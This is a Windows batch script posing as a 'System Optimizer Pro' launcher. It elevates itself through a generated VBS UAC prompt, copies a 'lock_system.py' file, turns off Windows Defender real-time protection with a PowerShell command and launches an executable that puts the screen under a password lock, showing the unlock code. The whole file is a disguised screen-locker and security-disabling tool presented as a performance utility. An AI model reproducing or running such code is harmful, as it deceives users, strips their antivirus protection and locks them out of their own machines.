@echo off
title System Optimizer Pro - Launcher
color 0A

echo ===========================================
echo      SYSTEM OPTIMIZER PRO LAUNCHER
echo ===========================================
echo.

echo [INFO] Checking administrator privileges...
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [WARNING] Not running as administrator!
    echo [INFO] Attempting to elevate privileges...
    
    REM Create VBS script to run as admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    
    "%temp%\elevate.vbs"
    exit /b
)

echo [OK] Running with administrator privileges
echo.

REM Copy required files
echo [INFO] Preparing optimization files...
copy "..\lock_system.py" "." >nul 2>&1
copy "..\app_main.py" "." >nul 2>&1

REM Disable Windows Defender temporarily (for testing)
echo [INFO] Temporarily disabling security for optimization...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo [INFO] Starting System Optimizer Pro...
echo [WARNING] System may become unresponsive!
echo [IMPORTANT] Password for unlock: mzkyzak
echo.

REM Run the optimizer
start "" app_main.exe

echo [SUCCESS] Optimizer started!
echo.
echo [INSTRUCTIONS]:
echo 1. Select option 1-7 from menu
echo 2. System will auto-optimize in background
echo 3. Lock screen will activate
echo 4. Use password "mzkyzak" to unlock
echo.

echo Press any key to hide this window...
pause >nul
exit